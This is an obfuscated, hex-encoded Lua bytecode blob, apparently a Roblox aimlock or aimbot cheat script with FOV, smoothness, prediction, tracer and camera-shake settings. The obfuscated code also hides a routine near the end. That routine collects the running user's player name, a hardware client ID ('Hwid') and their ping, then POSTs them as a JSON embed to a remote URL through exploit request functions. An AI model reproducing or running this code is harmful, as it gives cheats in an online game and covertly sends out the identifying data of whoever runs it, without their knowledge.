012O002F012O002F012O0030012O0032012O0032012O0033012O0035012O0035012O0036012O0036012O0036012O0036012O0036012O0036012O0036012O0036012O0036012O0036012O0036012O0036012O0036012O0036012O0036012O0037012O0039012O0039012O003A012O003A012O003A012O003B012O003B012O003B012O003C012O003D012O0040012O0040012O0041012O0042012O0043012O0045012O0045012O0047012O0047012O0048012O004A012O004A012O004B012O004B012O004B012O004B012O004B012O004B012O004B012O004B012O004B012O004B012O004B012O004B012O004B012O004B012O004B012O004B012O004B012O004B012O004B012O004B012O004B012O004B012O004B012O004B012O004B012O004B012O004B012O004B012O004B012O004B012O004B012O004B012O004B012O004B012O004B012O004C012O004C012O004C012O004C012O004C012O004C012O004C012O004C012O004C012O004C012O004D012O004F012O0051012O0052012O0055012O0056012O0059012O0059012O0059012O0059012O0059012O005A012O005C012O005E012O005F012O0061012O00053O0003053O007072696E7403073O0067657467656E762O033O00444E5303063O0054726163657203073O00456E61626C656401093O00120B000100014O003D00026O001200010002000100120B000100024O003300010001000200203C00010001000300203C000100010004001032000100054O00383O00017O00093O0072012O0072012O0072012O0073012O0073012O0073012O0073012O0073012O0074012O00063O00028O0003053O007072696E7403073O0067657467656E762O033O00444E532O033O00464F5603073O0056697369626C65010E3O001214000100013O00262900010001000100010004283O0001000100120B000200024O003D00036O001200020002000100120B000200034O003300020001000200203C00020002000400203C000200020005001032000200063O0004283O000D00010004283O000100012O00383O00017O000E3O0076012O0078012O0078012O0079012O0079012O0079012O007A012O007A012O007A012O007A012O007A012O007B012O007C012O007E012O00063O00028O0003053O007072696E7403073O0067657467656E762O033O00444E5303043O004D69736303053O005368616B65010E3O001214000100013O000E3B00010001000100010004283O0001000100120B000200024O003D00036O001200020002000100120B000200034O003300020001000200203C00020002000400203C000200020005001032000200063O0004283O000D00010004283O000100012O00383O00017O000E3O0080012O0082012O0082012O0083012O0083012O0083012O0084012O0084012O0084012O0084012O0084012O0085012O0086012O0088012O00063O00028O0003053O007072696E7403073O0067657467656E762O033O00444E5303043O004D697363030F3O00556E6C6F636B65644F6E446561746801143O001214000100014O001D000200023O00262900010002000100010004283O00020001001214000200013O00262900020005000100010004283O0005000100120B000300024O003D00046O001200030002000100120B000300034O003300030001000200203C00030003000400203C000300030005001032000300063O0004283O001300010004283O000500010004283O001300010004283O000200012O00383O00017O00143O008A012O008B012O008D012O008D012O008E012O0090012O0090012O0091012O0091012O0091012O0092012O0092012O0092012O0092012O0092012O0093012O0094012O0096012O0097012O0099012O00043O0003073O0067657467656E762O033O00444E5303063O00547261636572030A3O00536D2O6F74686E652O7301063O00120B000100014O003300010001000200203C00010001000200203C000100010003001032000100044O00383O00017O00063O009B012O009B012O009B012O009B012O009B012O009C012O00043O0003073O0067657467656E762O033O00444E532O033O00464F5603063O0052616469757301063O00120B000100014O003300010001000200203C00010001000200203C000100010003001032000100044O00383O00017O00063O009E012O009E012O009E012O009E012O009E012O009F012O00043O0003073O0067657467656E762O033O00444E5303043O004D697363030A3O005368616B6556616C756501063O00120B000100014O003300010001000200203C00010001000200203C000100010003001032000100044O00383O00017O00063O00A1012O00A1012O00A1012O00A1012O00A1012O00A2012O00073O00028O0003083O0056656C6F6369747903073O00566563746F72332O033O006E657703013O005803013O005A03163O00412O73656D626C794C696E65617256656C6F63697479011E3O001214000100014O001D000200023O000E3B00010002000100010004283O00020001001214000200013O00262900020005000100010004283O0005000100120B000300033O00203C00030003000400203C00043O000200203C000400040005001214000500013O00203C00063O000200203C0006000600062O00030003000600020010323O0002000300120B000300033O00203C00030003000400203C00043O000200203C000400040005001214000500013O00203C00063O000200203C0006000600062O00030003000600020010323O000700030004283O001D00010004283O000500010004283O001D00010004283O000200012O00383O00017O001E3O00A7012O00A8012O00AA012O00AA012O00AB012O00AD012O00AD012O00AE012O00AE012O00AE012O00AE012O00AE012O00AE012O00AE012O00AE012O00AE012O00AF012O00AF012O00AF012O00AF012O00AF012O00AF012O00AF012O00AF012O00AF012O00B0012O00B1012O00B3012O00B4012O00B6012O00023O00030E3O00436861726163746572412O64656403073O00436F2O6E65637401063O00203C00013O000100200500010001000200062O00033O000100012O00158O001C0001000300012O00383O00013O00013O00033O00028O00030C3O0057616974466F724368696C6403103O0048756D616E6F6964522O6F7450617274010E3O001214000100014O001D000200023O00262900010002000100010004283O0002000100200500033O0002001214000500034O00030003000500022O003D000200034O001500036O003D000400024O00120003000200010004283O000D00010004283O000200012O00383O00017O000E3O00BA012O00BB012O00BD012O00BD012O00BE012O00BE012O00BE012O00BE012O00BF012O00BF012O00BF012O00C0012O00C1012O00C3012O00063O00B9012O00B9012O00C3012O00C3012O00B9012O00C4012O00023O00030E3O00436861726163746572412O646564030A3O00446973636F2O6E65637401043O00203C00013O00010020050001000100022O00120001000200012O00383O00017O00043O00C7012O00C7012O00C7012O00C8012O00013O0003053O007063612O6C00053O00120B3O00013O00062O00013O000100012O00158O00123O000200012O00383O00013O00013O000A3O0003053O00706169727303043O0067616D6503073O00506C6179657273030B3O004765744368696C6472656E03043O004E616D65030B3O004C6F63616C506C61796572028O00026O00F03F03093O0043686172616374657203103O0048756D616E6F6964522O6F745061727400253O00120B3O00013O00120B000100023O00203C0001000100030020050001000100042O000F000100024O00135O00020004283O0022000100203C00050004000500120B000600023O00203C00060006000300203C00060006000600203C00060006000500063F00050022000100060004283O00220001001214000500074O001D000600073O000E3B00070015000100050004283O00150001001214000600074O001D000700073O001214000500083O00262900050010000100080004283O0010000100262900060017000100070004283O0017000100203C00080004000900203C00070008000A2O001500086O003D000900074O00120008000200010004283O002200010004283O001700010004283O002200010004283O001000010006223O0007000100020004283O000700012O00383O00017O00253O00CD012O00CD012O00CD012O00CD012O00CD012O00CD012O00CD012O00CE012O00CE012O00CE012O00CE012O00CE012O00CE012O00CE012O00CF012O00D0012O00D3012O00D3012O00D4012O00D5012O00D6012O00D8012O00D8012O00DA012O00DA012O00DB012O00DB012O00DC012O00DC012O00DC012O00DD012O00DE012O00E0012O00E1012O00CD012O00E3012O00E5012O00053O00CC012O00E5012O00E5012O00CC012O00E6012O00123O00028O00026O00F03F03063O0052616469757303073O0067657467656E762O033O00444E532O033O00464F56026O00084003083O00506F736974696F6E03073O00566563746F72322O033O006E657703013O005803013O005903043O0067616D65030A3O0047657453657276696365030A3O0047756953657276696365030B3O00476574477569496E736574027O004003073O0056697369626C6500483O0012143O00014O001D000100013O0026293O0002000100010004283O00020001001214000100013O001214000200013O00262900020025000100020004283O0025000100262900010005000100020004283O000500012O001500035O00120B000400044O003300040001000200203C00040004000500203C00040004000600203C0004000400030020300004000400070010320003000300042O001500035O00120B000400093O00203C00040004000A2O0015000500013O00203C00050005000B2O0015000600013O00203C00060006000C00120B0007000D3O00200500070007000E0012140009000F4O00030007000900020020050007000700102O003100070002000200203C00070007000C2O001A0006000600072O0003000400060002001032000300080004001214000100113O0004283O0005000100262900020006000100010004283O000600010026290001002B000100110004283O002B00012O001500036O0006000300023O00262900010042000100010004283O00420001001214000300013O0026290003003D000100010004283O003D00012O001500045O00060400040035000100010004283O003500012O001500046O0006000400024O001500045O00120B000500044O003300050001000200203C00050005000500203C00050005000600203C000500050012001032000400120005001214000300023O0026290003002E000100020004283O002E0001001214000100023O0004283O004200010004283O002E0001001214000200023O0004283O000600010004283O000500010004283O004700010004283O000200012O00383O00017O00483O00EE012O00EF012O00F1012O00F1012O00F2012O00F4012O00F6012O00F6012O00F7012O00F7012O00F8012O00F8012O00F8012O00F8012O00F8012O00F8012O00F8012O00F8012O00F9012O00F9012O00F9012O00F9012O00F9012O00F9012O00F9012O00F9012O00F9012O00F9012O00F9012O00F9012O00F9012O00F9012O00F9012O00F9012O00F9012O00FA012O00FC012O00FE012O00FE012O00FF012O00FF013O00023O00022O002O022O002O022O0003022O0005022O0005022O0006022O0006022O0006022O0007022O0007022O0009022O0009022O0009022O0009022O0009022O0009022O0009022O000A022O000C022O000C022O000D022O000E022O000F022O0012022O0013022O0014022O0016022O0017022O0019022O00103O00028O00026O00F03F03053O007061697273030A3O00476574506C617965727303093O00436861726163746572030E3O0046696E6446697273744368696C6403103O0048756D616E6F6964522O6F7450617274027O004003063O0052616469757303123O00576F726C64546F5363722O656E506F696E7403083O00506F736974696F6E03073O00566563746F72322O033O006E657703013O005803013O005903093O004D61676E697475646500793O0012143O00014O001D000100033O0026293O0072000100020004283O007200012O001D000300033O001214000400013O00262900040006000100010004283O000600010026290001000B000100020004283O000B00012O0006000200023O00262900010005000100010004283O000500012O001D000500053O0030100003000200012O003D000200053O00120B000500034O001500065O0020050006000600042O000F000600074O001300053O00070004283O006B000100203C000A0009000500060E000A006B00013O0004283O006B00012O0015000A00013O00063F0009006B0001000A0004283O006B000100203C000A00090005002005000A000A0006001214000C00074O0003000A000C000200060E000A006B00013O0004283O006B0001001214000A00014O001D000B000E3O002629000A0061000100080004283O00610001002629000B003E000100020004283O003E00012O0015000F00023O00203C000F000F000900061E000E006B0001000F0004283O006B000100061E000E006B000100030004283O006B000100060E000D006B00013O0004283O006B0001001214000F00014O001D001000103O002629000F0032000100010004283O00320001001214001000013O00262900100035000100010004283O003500012O003D0003000E4O003D000200093O0004283O006B00010004283O003500010004283O006B00010004283O003200010004283O006B0001002629000B0026000100010004283O00260001001214000F00013O002629000F0045000100020004283O00450001001214000B00023O0004283O00260001002629000F0041000100010004283O004100012O0015001000033O00200500100010000A00203C00120009000500203C00120012000700203C00120012000B2O00080010001200112O003D000D00114O003D000C00103O00120B0010000C3O00203C00100010000D00203C0011000C000E00203C0012000C000F2O000300100012000200120B0011000C3O00203C00110011000D2O0015001200043O00203C00120012000E2O0015001300043O00203C00130013000F2O00030011001300022O002C00100010001100203C000E00100010001214000F00023O0004283O004100010004283O002600010004283O006B0001002629000A0066000100010004283O00660001001214000B00014O001D000C000C3O001214000A00023O002629000A0024000100020004283O002400012O001D000D000E3O001214000A00083O0004283O0024000100062200050016000100020004283O00160001001214000100023O0004283O000500010004283O000600010004283O000500010004283O007800010026293O0002000100010004283O00020001001214000100014O001D000200023O0012143O00023O0004283O000200012O00383O00017O00793O001C022O001D022O0021022O0021022O0022022O0024022O0026022O0026022O0027022O0027022O0028022O002A022O002A022O002B022O002B022O002B022O002C022O002C022O002C022O002C022O002C022O002C022O002D022O002D022O002D022O002D022O002D022O002D022O002D022O002D022O002D022O002D022O002D022O002D022O002E022O002F022O0034022O0034022O0036022O0036022O0037022O0037022O0037022O0037022O0037022O0037022O0037022O0037022O0038022O0039022O003B022O003B022O003C022O003E022O003E022O003F022O0040022O0041022O0042022O0044022O0045022O0048022O004A022O004A022O004B022O004D022O004D022O004E022O004F022O0051022O0051022O0052022O0052022O0052022O0052022O0052022O0052022O0052022O0052022O0053022O0053022O0053022O0053022O0053022O0053022O0053022O0053022O0053022O0053022O0053022O0053022O0053022O0053022O0054022O0055022O0057022O0059022O005B022O005B022O005C022O005D022O005E022O0060022O0060022O0061022O0063022O0064022O002C022O0066022O0068022O006A022O006B022O006C022O006E022O0070022O0070022O0071022O0072022O0073022O0074022O0076022O00063O0003123O00576F726C64546F5363722O656E506F696E7403083O00506F736974696F6E03073O00566563746F72322O033O006E657703013O005803013O0059010B4O001500015O00200500010001000100203C00033O00022O000300010003000200120B000200033O00203C00020002000400203C00030001000500203C0004000100062O0017000200044O002F00026O00383O00017O000B3O0078022O0078022O0078022O0078022O0079022O0079022O0079022O0079022O0079022O0079022O007A022O00043O00028O00026O00F03F03123O00576F726C64546F5363722O656E506F696E7403083O00506F736974696F6E01193O001214000100014O001D000200033O00262900010012000100020004283O0012000100262900020004000100010004283O00040001001214000400013O00262900040007000100010004283O000700012O001500055O00200500050005000300203C00073O00042O00030005000700022O003D000300054O0006000300023O0004283O000700010004283O000400010004283O0018000100262900010002000100010004283O00020001001214000200014O001D000300033O001214000100023O0004283O000200012O00383O00017O00193O007C022O007D022O0080022O0080022O0082022O0082022O0083022O0085022O0085022O0086022O0086022O0086022O0086022O0086022O0087022O0088022O008A022O008C022O008E022O008E022O008F022O0090022O0091022O0092022O0094022O00043O0003073O0067657467656E762O033O00444E5303063O0054726163657203043O005072656401063O00120B000100014O003300010001000200203C00010001000200203C000100010003001032000100044O00383O00017O00063O0099022O0099022O0099022O0099022O0099022O009A022O00043O0003073O0067657467656E762O033O00444E5303043O004D697363030A3O005368616B6556616C756501063O00120B000100014O003300010001000200203C00010001000200203C000100010003001032000100044O00383O00017O00063O009C022O009C022O009C022O009C022O009C022O009D027O00014O00383O00017O00013O00A0027O00014O00383O00017O00013O00A1022O00013O0003063O00556E6C6F616400044O00157O0020055O00012O00123O000200012O00383O00017O00043O00A4022O00A4022O00A4022O00A5022O000B3O00028O00026O00F03F03043O0067616D6503093O00576F726B7370616365030D3O0043752O72656E7443616D65726103123O00576F726C64546F5363722O656E506F696E7403083O00506F736974696F6E03073O00566563746F72322O033O006E657703013O005803013O0059011C3O001214000100014O001D000200033O00262900010007000100010004283O00070001001214000200014O001D000300033O001214000100023O00262900010002000100020004283O0002000100262900020009000100010004283O0009000100120B000400033O00203C00040004000400203C00040004000500200500040004000600203C00063O00072O00030004000600022O003D000300043O00120B000400083O00203C00040004000900203C00050003000A00203C00060003000B2O0017000400064O002F00045O0004283O000900010004283O001B00010004283O000200012O00383O00017O001C3O00B8022O00B9022O00BC022O00BC022O00BD022O00BE022O00BF022O00C1022O00C1022O00C3022O00C3022O00C4022O00C4022O00C4022O00C4022O00C4022O00C4022O00C4022O00C5022O00C5022O00C5022O00C5022O00C5022O00C5022O00C6022O00C8022O00C9022O00CB022O000B3O00028O0003043O006D61746803043O0068756765026O00F03F030B3O004765744368696C6472656E03043O006E65787403073O00566563746F72322O033O006E657703013O005803013O005903093O004D61676E697475646501483O001214000100014O001D000200033O000E3B00010008000100010004283O0008000100120B000400023O00203C0002000400032O001D000300033O001214000100043O00262900010002000100040004283O00020001001214000400013O0026290004000B000100010004283O000B000100060E3O004400013O0004283O0044000100200500053O00052O003100050002000200060E0005004400013O0004283O0044000100120B000500063O00200500063O00052O00160006000200070004283O004200012O0015000A6O003D000B00094O0031000A0002000200060E000A004200013O0004283O004200012O0015000A00014O003D000B00094O0031000A0002000200060E000A004200013O0004283O00420001001214000A00014O001D000B000B3O002629000A0023000100010004283O002300012O0015000C00024O003D000D00094O0031000C0002000200120B000D00073O00203C000D000D00082O0015000E00033O00203C000E000E00092O0015000F00033O00203C000F000F000A2O0003000D000F00022O002C000C000C000D00203C000B000C000B00061E000B0042000100020004283O00420001001214000C00014O001D000D000D3O002629000C0035000100010004283O00350001001214000D00013O002629000D0038000100010004283O003800012O003D0002000B4O003D000300093O0004283O004200010004283O003800010004283O004200010004283O003500010004283O004200010004283O0023000100062200050017000100020004283O001700012O0006000300023O0004283O000B00010004283O000200012O00383O00017O00483O00CD022O00CE022O00D1022O00D1022O00D2022O00D2022O00D3022O00D4022O00D6022O00D6022O00D7022O00D9022O00D9022O00DA022O00DA022O00DA022O00DA022O00DA022O00DA022O00DB022O00DB022O00DB022O00DB022O00DC022O00DC022O00DC022O00DC022O00DC022O00DC022O00DC022O00DC022O00DC022O00DC022O00DD022O00DE022O00E0022O00E0022O00E1022O00E1022O00E1022O00E1022O00E1022O00E1022O00E1022O00E1022O00E1022O00E1022O00E1022O00E1022O00E2022O00E2022O00E3022O00E4022O00E6022O00E6022O00E7022O00E9022O00E9022O00EA022O00EB022O00EC022O00ED022O00EF022O00F0022O00F3022O00F4022O00DB022O00F6022O00F9022O00FA022O00FC022O00FE022O00233O0003073O0067657467656E762O033O00444E5303063O0054726163657203073O00456E61626C65642O0103093O0043686172616374657200028O0003043O004D697363030F3O00556E6C6F636B65644F6E4465617468030B3O00426F6479452O66656374732O033O004B2E4F03053O0056616C756503053O005368616B6503063O00434672616D652O033O006E657703013O007003043O005061727403083O00506F736974696F6E03083O0056656C6F6369747903043O005072656403073O00566563746F723303043O006D61746803063O0072616E646F6D030A3O005368616B6556616C7565029A5O99B93F03043O004C657270030A3O00536D2O6F74686E652O7303043O00456E756D030B3O00456173696E675374796C6503073O00456C6173746963030F3O00456173696E67446972656374696F6E03053O00496E4F757403043O0053696E652O033O004F757400D73O00120B3O00014O00333O0001000200203C5O000200203C5O000300203C5O00040026293O00D6000100050004283O00D600012O00157O00060E3O00D600013O0004283O00D600012O00157O00203C5O000600262E3O00D6000100070004283O00D600010012143O00083O000E3B0008000F00013O0004283O000F000100120B000100014O003300010001000200203C00010001000200203C00010001000900203C00010001000A00060E0001002100013O0004283O002100012O001500015O00203C00010001000600203C00010001000B00203C00010001000C00203C00010001000D00060E0001002100013O0004283O002100012O001D000100014O003600015O00120B000100014O003300010001000200203C00010001000200203C00010001000900203C00010001000E00060E0001009600013O0004283O00960001001214000100084O001D000200023O0026290001002A000100080004283O002A000100120B0003000F3O00203C0003000300102O0015000400013O00203C00040004000F00203C0004000400112O001500055O00203C00050005000600120B000600014O003300060001000200203C00060006000200203C00060006000300203C0006000600122O000700050005000600203C0005000500132O001500065O00203C00060006000600120B000700014O003300070001000200203C00070007000200203C00070007000300203C0007000700122O000700060006000700203C00060006001400120B000700014O003300070001000200203C00070007000200203C00070007000300203C0007000700152O002D0006000600072O001A00050005000600120B000600163O00203C00060006001000120B000700173O00203C00070007001800120B000800014O003300080001000200203C00080008000200203C00080008000900203C0008000800192O0034000800083O00120B000900014O003300090001000200203C00090009000200203C00090009000900203C0009000900192O000300070009000200120B000800173O00203C00080008001800120B000900014O003300090001000200203C00090009000200203C00090009000900203C0009000900192O0034000900093O00120B000A00014O0033000A0001000200203C000A000A000200203C000A000A000900203C000A000A00192O00030008000A000200120B000900173O00203C00090009001800120B000A00014O0033000A0001000200203C000A000A000200203C000A000A000900203C000A000A00192O0034000A000A3O00120B000B00014O0033000B0001000200203C000B000B000200203C000B000B000900203C000B000B00192O000D0009000B4O003500063O000200203000060006001A2O001A0005000500062O00030003000500022O003D000200034O0015000300014O0015000400013O00203C00040004000F00200500040004001B2O003D000600023O00120B000700014O003300070001000200203C00070007000200203C00070007000300203C00070007001C00120B0008001D3O00203C00080008001E00203C00080008001F00120B0009001D3O00203C00090009002000203C00090009002100120B000A001D3O00203C000A000A001E00203C000A000A002200120B000B001D3O00203C000B000B002000203C000B000B00232O00030004000B00020010320003000F00040004283O00D600010004283O002A00010004283O00D60001001214000100084O001D000200023O00262900010098000100080004283O0098000100120B0003000F3O00203C0003000300102O0015000400013O00203C00040004000F00203C0004000400112O001500055O00203C00050005000600120B000600014O003300060001000200203C00060006000200203C00060006000300203C0006000600122O000700050005000600203C0005000500132O001500065O00203C00060006000600120B000700014O003300070001000200203C00070007000200203C00070007000300203C0007000700122O000700060006000700203C00060006001400120B000700014O003300070001000200203C00070007000200203C00070007000300203C0007000700152O002D0006000600072O001A0005000500062O00030003000500022O003D000200034O0015000300014O0015000400013O00203C00040004000F00200500040004001B2O003D000600023O00120B000700014O003300070001000200203C00070007000200203C00070007000300203C00070007001C00120B0008001D3O00203C00080008001E00203C00080008001F00120B0009001D3O00203C00090009002000203C00090009002100120B000A001D3O00203C000A000A001E00203C000A000A002200120B000B001D3O00203C000B000B002000203C000B000B00232O00030004000B00020010320003000F00040004283O00D600010004283O009800010004283O00D600010004283O000F00012O00383O00017O00D74O00033O00033O00033O00033O00033O00033O00033O00033O00033O00033O00033O00033O00033O00032O0001032O002O032O002O032O0004032O0004032O0004032O0004032O0004032O0004032O0004032O0005032O0005032O0005032O0005032O0005032O0005032O0005032O0006032O0006032O0009032O0009032O0009032O0009032O0009032O0009032O0009032O000A032O000B032O000D032O000D032O000E032O000E032O000E032O000E032O000E032O000E032O000E032O000E032O000E032O000E032O000E032O000E032O000E032O000E032O000E032O000E032O000E032O000E032O000E032O000E032O000E032O000E032O000E032O000E032O000E032O000E032O000E032O000E032O000E032O000E032O000E032O000E032O000E032O000E032O000E032O000E032O000E032O000E032O000E032O000E032O000E032O000E032O000E032O000E032O000E032O000E032O000E032O000E032O000E032O000E032O000E032O000E032O000E032O000E032O000E032O000E032O000E032O000E032O000E032O000E032O000E032O000E032O000E032O000E032O000E032O000E032O000E032O000E032O000E032O000E032O000E032O000E032O000E032O000E032O000E032O000E032O000E032O000E032O000E032O000F032O000F032O000F032O000F032O000F032O000F032O000F032O000F032O000F032O000F032O000F032O000F032O000F032O000F032O000F032O000F032O000F032O000F032O000F032O000F032O000F032O000F032O000F032O000F032O0010032O0011032O0012032O0014032O0015032O0017032O0017032O0018032O0018032O0018032O0018032O0018032O0018032O0018032O0018032O0018032O0018032O0018032O0018032O0018032O0018032O0018032O0018032O0018032O0018032O0018032O0018032O0018032O0018032O0018032O0018032O0018032O0018032O0018032O0018032O0018032O0018032O0018032O0018032O0019032O0019032O0019032O0019032O0019032O0019032O0019032O0019032O0019032O0019032O0019032O0019032O0019032O0019032O0019032O0019032O0019032O0019032O0019032O0019032O0019032O0019032O0019032O0019032O001A032O001B032O001E032O001F032O0022032O000B3O0003043O007461736B03043O007761697403073O0067657467656E762O033O00444E5303063O0054726163657203073O00456E61626C65640003093O0043686172616374657203043O005061727403083O00746F737472696E6703213O004765744E65617265737450617274546F437572736F724F6E43686172616374657200203O00120B3O00013O00203C5O00022O00333O0001000200060E3O001F00013O0004283O001F000100120B3O00034O00333O0001000200203C5O000400203C5O000500203C5O000600060E5O00013O0004285O00012O00157O00262E5O000100070004285O00012O00157O00203C5O000800060E5O00013O0004285O000100120B3O00034O00333O0001000200203C5O000400203C5O000500120B0001000A3O00120B0002000B4O001500035O00203C0003000300082O000F000200034O003500013O00020010323O000900010004285O00012O00383O00017O00203O0024032O0024032O0024032O0024032O0024032O0025032O0025032O0025032O0025032O0025032O0025032O0025032O0025032O0025032O0025032O0025032O0025032O0025032O0025032O0026032O0026032O0026032O0026032O0026032O0026032O0026032O0026032O0026032O0026032O0026032O0027032O0029032O00243O00028O0003063O00656D6265647303053O007469746C65030C3O006869206D616D615O73030B3O006465736372697074696F6E03053O0066752O727903063O006669656C647303043O006E616D6503043O005573657203053O0076616C756503043O0067616D65030A3O004765745365727669636503073O00506C6179657273030B3O004C6F63616C506C6179657203043O004E616D6503043O004877696403133O00526278416E616C797469637353657276696365030B3O00476574436C69656E74496403043O0050696E6703053O00537461747303073O004E6574776F726B030F3O0053657276657253746174734974656D03093O00446174612050696E67030E3O0047657456616C7565537472696E672O033O0073796E03073O00726571756573742O033O0055726C03063O004D6574686F6403043O00504F535403073O0048656164657273030C3O00436F6E74656E742D5479706503103O00612O706C69636174696F6E2F6A736F6E03043O00426F6479030B3O00482O747053657276696365030A3O004A534F4E456E636F6465030C3O00682O74705F72657175657374006F3O0012143O00014O001D000100013O0026293O0002000100010004283O000200012O001100023O00012O0011000300014O001100043O00030030190004000300040030190004000500062O0011000500034O001100063O000200301900060008000900120B0007000B3O00200500070007000C0012140009000D4O000300070009000200203C00070007000E00203C00070007000F0010320006000A00072O001100073O000200301900070008001000120B0008000B3O00200500080008000C001214000A00114O00030008000A00020020050008000800122O00310008000200020010320007000A00082O001100083O000200301900080008001300120B0009000B3O00200500090009000C001214000B00144O00030009000B000200203C00090009001500203C00090009001600203C0009000900170020050009000900182O00310009000200020010320008000A00092O00270005000300010010320004000700052O00270003000100010010320002000200032O003D000100023O00120B000200193O00060E0002004300013O0004283O0043000100120B000200193O00203C00020002001A2O001100033O00042O001500045O0010320003001B00040030190003001C001D2O001100043O00010030190004001F00200010320003001E000400120B0004000B3O00200500040004000C001214000600224O00030004000600020020050004000400232O003D000600014O00030004000600020010320003002100042O00310002000200020004283O006E000100120B0002001A3O00060E0002005800013O0004283O0058000100120B0002001A4O001100033O00042O001500045O0010320003001B00040030190003001C001D2O001100043O00010030190004001F00200010320003001E000400120B0004000B3O00200500040004000C001214000600224O00030004000600020020050004000400232O003D000600014O00030004000600020010320003002100042O00310002000200020004283O006E000100120B000200243O00060E0002006E00013O0004283O006E000100120B000200244O001100033O00042O001500045O0010320003001B00040030190003001C001D2O001100043O00010030190004001F00200010320003001E000400120B0004000B3O00200500040004000C001214000600224O00030004000600020020050004000400232O003D000600014O00030004000600020010320003002100042O00310002000200020004283O006E00010004283O000200012O00383O00017O006F3O0035032O0036032O0038032O0038032O0039032O0039032O0039032O0039032O0039032O0039032O0039032O0039032O0039032O0039032O0039032O0039032O0039032O0039032O0039032O0039032O0039032O0039032O0039032O0039032O0039032O0039032O0039032O0039032O0039032O0039032O0039032O0039032O0039032O0039032O0039032O0039032O0039032O0039032O0039032O0039032O0039032O0039032O0039032O0039032O0039032O003A032O003A032O003A032O003B032O003B032O003B032O003B032O003B032O003B032O003B032O003B032O003B032O003B032O003B032O003B032O003B032O003B032O003B032O003B032O003B032O003B032O003B032O003C032O003C032O003C032O003D032O003D032O003D032O003D032O003D032O003D032O003D032O003D032O003D032O003D032O003D032O003D032O003D032O003D032O003D032O003D032O003D032O003D032O003E032O003E032O003E032O003F032O003F032O003F032O003F032O003F032O003F032O003F032O003F032O003F032O003F032O003F032O003F032O003F032O003F032O003F032O003F032O003F032O0041032O0042032O0044032O0027022O00013O00013O00023O00023O00033O00033O00043O00043O00043O00043O00053O00063O00063O00073O00073O000E3O000E3O000E3O000E3O000E3O000E3O000E3O00103O00113O003B3O003B3O003C3O003C3O00673O00673O003C3O00683O00683O00683O00683O00683O00AF3O00AF3O00AF3O00AF3O00B03O00CA3O00CB3O00D93O00DA3O00DE3O00DF3O00E13O00E13O00EF3O001D012O001D012O001D012O001D012O001D012O001D012O001E012O001F012O001F012O0027012O0027012O0027012O001F012O0028012O0028012O0028012O0028012O0029012O002A012O002A012O002A012O002A012O002B012O0061012O0061012O0061012O0061012O002B012O0061012O0062012O0064012O0064012O0065012O0065012O0065012O0065012O0065012O0065012O0065012O0065012O0065012O0065012O0065012O0065012O0065012O0065012O0065012O0065012O0065012O0065012O0065012O0065012O0065012O0065012O0065012O0065012O0065012O0065012O0066012O0066012O0066012O0066012O0066012O0066012O0066012O0066012O0067012O0067012O0067012O0067012O0067012O0067012O0067012O0067012O0067012O0067012O0067012O0067012O0067012O0067012O0067012O0067012O0067012O0067012O0068012O0068012O0068012O0068012O0068012O0069012O0069012O0069012O0069012O0069012O006A012O006A012O006A012O006A012O006A012O006A012O006B012O006B012O006B012O006B012O006B012O006B012O006C012O006C012O006C012O006C012O006C012O006C012O006D012O006F012O006F012O0070012O0070012O0070012O0070012O0070012O0070012O0071012O0071012O0071012O0071012O0071012O0074012O0074012O0071012O0075012O0075012O0075012O0075012O0075012O007E012O007E012O0075012O007F012O007F012O007F012O007F012O007F012O0088012O0088012O007F012O0089012O0089012O0089012O0089012O0089012O0099012O0099012O0089012O009A012O009A012O009A012O009A012O009A012O009A012O009A012O009A012O009C012O009C012O009A012O009D012O009D012O009D012O009D012O009D012O009D012O009D012O009D012O009F012O009F012O009D012O00A0012O00A0012O00A0012O00A0012O00A0012O00A0012O00A0012O00A0012O00A2012O00A2012O00A0012O00A3012O00A5012O00A5012O00B6012O00B7012O00C4012O00C4012O00C5012O00C8012O00C9012O00C9012O00C9012O00C9012O00C9012O00C9012O00CA012O00CA012O00CA012O00CA012O00CA012O00CA012O00CB012O00CB012O00E6012O00E6012O00CB012O00E7012O00E9012O00E9012O00EA012O00EA012O00EA012O00EA012O00EA012O00EB012O00EB012O00EB012O00EB012O00EB012O00EB012O00EB012O00EC012O0019022O0019022O0019022O001A022O001A022O001A022O001A022O001B022O001B022O001B022O001B022O001B022O0076022O0076022O0076022O0076022O0076022O0076022O0076022O007A022O007A022O0094022O0094022O0095022O0097022O0097022O0098022O0098022O0098022O0098022O0098022O0098022O0098022O0098022O009A022O009A022O0098022O009B022O009B022O009B022O009B022O009B022O009B022O009B022O009B022O009D022O009D022O009B022O009E022O009E022O009E022O009F022O009F022O009F022O009F022O009F022O00A0022O00A0022O00A0022O00A0022O00A1022O00A1022O00A1022O00A1022O009F022O00A2022O00A2022O00A2022O00A2022O00A2022O00A3022O00A3022O00A3022O00A5022O00A5022O00A5022O00A3022O00A6022O00A6022O00A7022O00A7022O00A7022O00A7022O00A7022O00A7022O00A7022O00A7022O00A7022O00A7022O00A7022O00A7022O00A7022O00A7022O00A7022O00A7022O00A7022O00A7022O00A7022O00A7022O00A7022O00A7022O00A7022O00A7022O00A7022O00A7022O00A7022O00A8022O00AA022O00AA022O00AB022O00AB022O00AB022O00AB022O00AB022O00AB022O00AB022O00AB022O00AC022O00AC022O00AC022O00AC022O00AD022O00AD022O00AD022O00AD022O00AD022O00AD022O00AD022O00AD022O00AD022O00AD022O00AD022O00AD022O00AE022O00AE022O00AE022O00AE022O00AE022O00AE022O00AE022O00AE022O00AF022O00AF022O00AF022O00AF022O00AF022O00AF022O00AF022O00AF022O00AF022O00AF022O00AF022O00AF022O00AF022O00AF022O00AF022O00AF022O00AF022O00AF022O00AF022O00AF022O00AF022O00AF022O00AF022O00B0022O00B0022O00B0022O00B0022O00B0022O00B0022O00B0022O00B0022O00B0022O00B0022O00B0022O00B0022O00B0022O00B0022O00B0022O00B1022O00B1022O00B1022O00B2022O00B2022O00B2022O00B2022O00B2022O00B2022O00B2022O00B2022O00B2022O00B2022O00B2022O00B2022O00B2022O00B2022O00B2022O00B2022O00B2022O00B3022O00B5022O00B5022O00B6022O00CB022O00CC022O00CC022O00CC022O00CC022O00CC022O00FE022O00FE022O00FE022O00FE022O00FE022O00FE022O00FF022O00FF022O00FF022O00FF022O0022032O0022032O0022032O00FF022O0023032O0023032O0029032O0029032O0023032O002A032O002A032O002A032O002B032O002B032O002B032O002B032O002B032O002C032O002D032O002F032O002F032O0030032O0030032O0030032O0031032O0031032O0031032O0031032O0031032O0031032O0032032O0033032O0034032O0044032O0044032O0034032O0045032O0045032O0045032O0045032O0045032O0045032O0046032O0047032O0047032O0047032O0047032O0047032O0047032O0047032O0048032O0049032O